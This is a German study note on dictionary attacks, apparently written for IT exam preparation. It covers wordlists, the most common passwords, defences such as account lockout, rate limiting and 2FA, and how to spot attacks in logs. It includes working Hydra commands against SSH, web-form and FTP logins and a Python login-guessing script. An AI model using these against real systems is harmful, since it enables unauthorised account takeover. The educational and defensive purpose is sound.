---
{"dg-publish":true,"permalink":"/02-resources/notes/woerterbuchattacken/","tags":["sicherheit/it-sicherheit","sicherheit/passwort","ausbildung/gfn/ap1/vorbereitung"],"noteIcon":"","updated":"2025-11-06T13:41:30.828+01:00"}
---

>Eine **Wörterbuchattacke (Dictionary Attack)** ist ein Angriffsmethode, bei der ein Angreifer systematisch **vorbereitete Listen** von häufig verwendeten Passwörtern, Wörtern und Kombinationen durchprobiert, um Zugang zu einem System zu erhalten.
>>Im Gegensatz zur [[Brute-Force-Attacke\|Brute-Force-Attacke]], die alle möglichen Kombinationen testet, nutzt die Wörterbuchattacke **vorhandene Wortlisten**, um gezielter und schneller zu arbeiten.

>[!danger] Kritische Gefahr
>Wörterbuchattacken sind besonders erfolgreich, weil viele Nutzer **schwache, vorhersagbare Passwörter** verwenden!

---

# Wie funktioniert eine Wörterbuchattacke?

>Der Angreifer verwendet eine **Wortliste** (Dictionary) mit häufig genutzten Passwörtern und probiert diese nacheinander aus.

**Ablauf:**
```
1. Angreifer lädt Wortliste (z.B. "rockyou.txt" mit 14 Mio. Passwörtern)
   ↓
2. Tool probiert jedes Passwort aus der Liste
   ↓
3. Bei Treffer: Zugriff erfolgreich!
```

**Typische Wortlisten enthalten:**
- Häufige Passwörter: `password`, `123456`, `qwerty`
- Namen: `michael`, `jennifer`, `admin`
- Wörter aus Wörterbüchern
- Variationen: `P@ssw0rd`, `Password123`
- Bekannte Leaks (z.B. aus Datenpannen)

---

# Unterschied: Wörterbuchattacke vs. Brute-Force

| Aspekt | Wörterbuchattacke | Brute-Force |
|--------|-------------------|-------------|
| **Methode** | Vordefinierte Wortliste | Alle möglichen Kombinationen |
| **Geschwindigkeit** | Schneller (gezielt) | Langsamer (umfassend) |
| **Erfolgsrate** | Hoch bei schwachen Passwörtern | Garantiert (mit genug Zeit) |
| **Passwortlänge** | Effektiv bei kurzen Passwörtern | Funktioniert unabhängig von Länge |
| **Beispiel** | `password`, `123456`, `admin` | `aaaa`, `aaab`, `aaac`, ... |

>[!info] Kombination
>Oft werden **Hybrid-Angriffe** verwendet: Wörterbuch + Variationen (z.B. `password1`, `password2`, `Password!`)

---

# Visualisierung: Wörterbuchattacke

```
┌─────────────────┐
│  Angreifer      │
└────────┬────────┘
         │
         │ 1. Wortliste laden
         ↓
┌─────────────────┐
│  rockyou.txt    │
│  - password     │
│  - 123456       │
│  - qwerty       │
│  - admin        │
│  - letmein      │
│  - ...          │
└────────┬────────┘
         │
         │ 2. Passwörter ausprobieren
         ↓
┌─────────────────┐
│   Login-System  │
│                 │
│  Username: admin│
│  Password: ???  │
└────────┬────────┘
         │
         │ 3. Treffer: "password"
         ↓
    ✅ Zugriff!
```

---

# Häufigste Passwörter (Top 10)

>[!warning] Diese Passwörter werden zuerst getestet!

| Rang | Passwort | Häufigkeit |
|------|----------|------------|
| 1 | `123456` | Millionen von Nutzern |
| 2 | `password` | Extrem häufig |
| 3 | `123456789` | Variation von #1 |
| 4 | `12345678` | Variation von #1 |
| 5 | `12345` | Variation von #1 |
| 6 | `qwerty` | Tastaturmuster |
| 7 | `abc123` | Einfache Kombination |
| 8 | `password123` | Variation von #2 |
| 9 | `admin` | Standard-Login |
| 10 | `letmein` | "Let me in" |

>[!caution] Niemals verwenden!
>Diese Passwörter werden in **Sekunden** geknackt!

---

# Bekannte Wortlisten

## rockyou.txt
>Die **bekannteste Wortliste** mit ~14 Millionen echten Passwörtern aus einem Datenleak.

**Herkunft**: 2009 RockYou-Datenleck
**Verwendung**: Standard bei Penetrationstests

```bash
# Erste 10 Einträge anzeigen
head -10 rockyou.txt
```

## Andere bekannte Listen
- **CrackStation**: 15 GB, über 1,5 Milliarden Einträge
- **SecLists**: Sammlung verschiedener Wortlisten
- **Kali Linux Wordlists**: `/usr/share/wordlists/`
- **Common-Passwords**: Top 10.000 Passwörter

---

# Praktisches Beispiel: Hydra (Wörterbuchattacke)

**Hydra** ist ein Tool für Wörterbuchattacken gegen Login-Systeme.

```bash
# SSH Login mit Wortliste angreifen
hydra -l admin -P rockyou.txt ssh://192.168.1.100

# Webformular angreifen
hydra -l user@example.com -P wordlist.txt example.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=incorrect"

# FTP angreifen
hydra -l admin -P passwords.txt ftp://192.168.1.100
```

**Parameter:**
- `-l`: Benutzername (bekannt)
- `-L`: Datei mit Benutzernamen
- `-p`: Ein Passwort
- `-P`: Wortliste mit Passwörtern
- `-t`: Anzahl paralleler Verbindungen

>[!danger] Nur für autorisierte Tests!
>Wörterbuchattacken sind **illegal** ohne Erlaubnis des Systembetreibers!

---

# Schutzmaßnahmen gegen Wörterbuchattacken

## 1. Starke Passwörter verwenden

>[!success] Sichere Passwörter
>- **Mindestens 12-16 Zeichen**
>- **Groß- und Kleinbuchstaben**
>- **Zahlen und Sonderzeichen**
>- **Keine Wörter** aus Wörterbüchern
>- **Keine persönlichen Infos** (Name, Geburtsdatum)

**Beispiel:**
```
❌ Schwach:   password123
❌ Schwach:   Michael1990
✅ Stark:     K9$mZ#pL2@vQ8nR
✅ Stark:     Correct-Horse-Battery-Staple-42! (Passphrase)
```

## 2. Account-Lockout implementieren

>Nach **X fehlgeschlagenen Login-Versuchen** wird der Account gesperrt.

**Implementierung (Python/Flask):**
```python
from flask import Flask, request, session
from datetime import datetime, timedelta

app = Flask(__name__)
login_attempts = {}

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Prüfen, ob Account gesperrt
    if username in login_attempts:
        attempts, lockout_until = login_attempts[username]

        if datetime.now() < lockout_until:
            return "Account gesperrt! Versuchen Sie es später.", 403

        if attempts >= 5:
            # Account für 15 Minuten sperren
            login_attempts[username] = (attempts + 1, datetime.now() + timedelta(minutes=15))
            return "Zu viele Fehlversuche! Account gesperrt.", 403

    # Login prüfen
    if check_password(username, password):
        login_attempts.pop(username, None)  # Reset
        return "Login erfolgreich!", 200
    else:
        # Fehlversuch zählen
        attempts = login_attempts.get(username, (0, None))[0] + 1
        login_attempts[username] = (attempts, datetime.now())
        return f"Falsches Passwort! Versuch {attempts}/5", 401
```

## 3. Rate Limiting

>Begrenze die **Anzahl der Login-Versuche pro Zeiteinheit**.

**Beispiel**: Maximal 5 Versuche pro Minute

## 4. CAPTCHA verwenden

>Nach mehreren Fehlversuchen wird ein **CAPTCHA** angezeigt.

```
Login-Versuche:
1-2: Kein CAPTCHA
3-5: CAPTCHA
6+:  Account gesperrt
```

## 5. Zwei-Faktor-Authentifizierung (2FA)

>Selbst wenn das Passwort geknackt wird, benötigt der Angreifer einen **zweiten Faktor**.

**Methoden:**
- SMS-Code
- Authenticator-App (Google Authenticator, Authy)
- Hardware-Token (YubiKey)
- Biometrie

## 6. Passwort-Komplexitätsregeln

>System erzwingt **starke Passwörter** bei der Erstellung.

**Regeln:**
- Mindestlänge: 12 Zeichen
- Mind. 1 Großbuchstabe
- Mind. 1 Kleinbuchstabe
- Mind. 1 Zahl
- Mind. 1 Sonderzeichen
- Keine bekannten Passwörter (Blacklist)

## 7. Passwort-Manager

>Nutze **Passwort-Manager** für einzigartige, starke Passwörter.

**Empfohlene Tools:**
- Bitwarden (Open Source)
- 1Password
- KeePass (offline)
- LastPass

---

# Erkennung von Wörterbuchattacken

## Log-Analyse

**Verdächtige Anzeichen:**
```
[2025-11-06 10:15:01] Failed login: admin from 192.168.1.50
[2025-11-06 10:15:02] Failed login: admin from 192.168.1.50
[2025-11-06 10:15:03] Failed login: admin from 192.168.1.50
[2025-11-06 10:15:04] Failed login: admin from 192.168.1.50
[2025-11-06 10:15:05] Failed login: admin from 192.168.1.50
...
→ 50 Versuche in 50 Sekunden = Wörterbuchattacke!
```

## Monitoring-Tools

- **Fail2Ban**: Automatisches Blocken nach Fehlversuchen
- **OSSEC**: Intrusion Detection System
- **Splunk**: Log-Analyse
- **ELK Stack**: Elasticsearch, Logstash, Kibana

---

# Code-Beispiel: Einfache Wörterbuchattacke (Python)

```python
import requests
from time import sleep

def dictionary_attack(url, username, wordlist_file):
    """Führt eine Wörterbuchattacke auf ein Login-Formular aus"""

    print(f"Starte Wörterbuchattacke auf {url}")
    print(f"Username: {username}")

    with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
        for line_num, password in enumerate(f, 1):
            password = password.strip()

            # POST-Request mit Credentials
            data = {
                'username': username,
                'password': password
            }

            response = requests.post(url, data=data)

            # Erfolg prüfen (je nach Website anpassen!)
            if "Login successful" in response.text or response.status_code == 200:
                print(f"✅ PASSWORD GEFUNDEN: {password}")
                return password

            if line_num % 100 == 0:
                print(f"Versucht: {line_num} Passwörter...")

            # Rate Limiting umgehen (ethisch fragwürdig!)
            sleep(0.1)

    print("❌ Kein Passwort gefunden")
    return None

# NUR ZU TESTZWECKEN AUF EIGENEN SYSTEMEN!
# dictionary_attack("http://localhost/login", "admin", "rockyou.txt")
```

>[!danger] Warnung
>Dieses Script ist **nur für autorisierte Penetrationstests** auf eigenen Systemen!

---

# Zusammenfassung

>[!summary] Kernpunkte
>- **Wörterbuchattacke** = Systematisches Durchprobieren vordefinierter Passwortlisten
>- **Schneller als Brute-Force**, aber nur erfolgreich bei schwachen Passwörtern
>- **Top-Ziele**: `password`, `123456`, `admin`, `qwerty`
>- **Schutz**: Starke Passwörter, Account-Lockout, Rate Limiting, 2FA, CAPTCHA
>- **Tools**: Hydra, John the Ripper, Medusa

>[!important] Goldene Regel
>**Verwende niemals Passwörter aus Wörterbüchern oder häufige Kombinationen!**

---

# Verwandte Konzepte

- [[Brute-Force-Attacke\|Brute-Force-Attacke]] - Alle Kombinationen durchprobieren
- [[Rainbow Tables\|Rainbow Tables]] - Vorberechnete Hash-Tabellen
- [[Passwort-Hashing\|Passwort-Hashing]] - Sichere Passwortspeicherung
- [[Zwei-Faktor-Authentifizierung\|Zwei-Faktor-Authentifizierung]] - Zusätzliche Sicherheitsebene
- [[02 - RESOURCES/Notes/Social Engineering\|Social Engineering]] - Passwörter durch Manipulation erhalten

---

# Weiterführende Ressourcen

📚 **Dokumentation**:
- OWASP: Password Storage Cheat Sheet
- NIST: Digital Identity Guidelines

🔧 **Tools** (nur für autorisierte Tests):
- **Hydra**: Login-Angriffe
- **John the Ripper**: Passwort-Cracking
- **Hashcat**: GPU-beschleunigtes Cracking
- **Medusa**: Parallele Login-Angriffe

📦 **Wortlisten**:
- SecLists (GitHub)
- CrackStation
- Kali Linux Wordlists
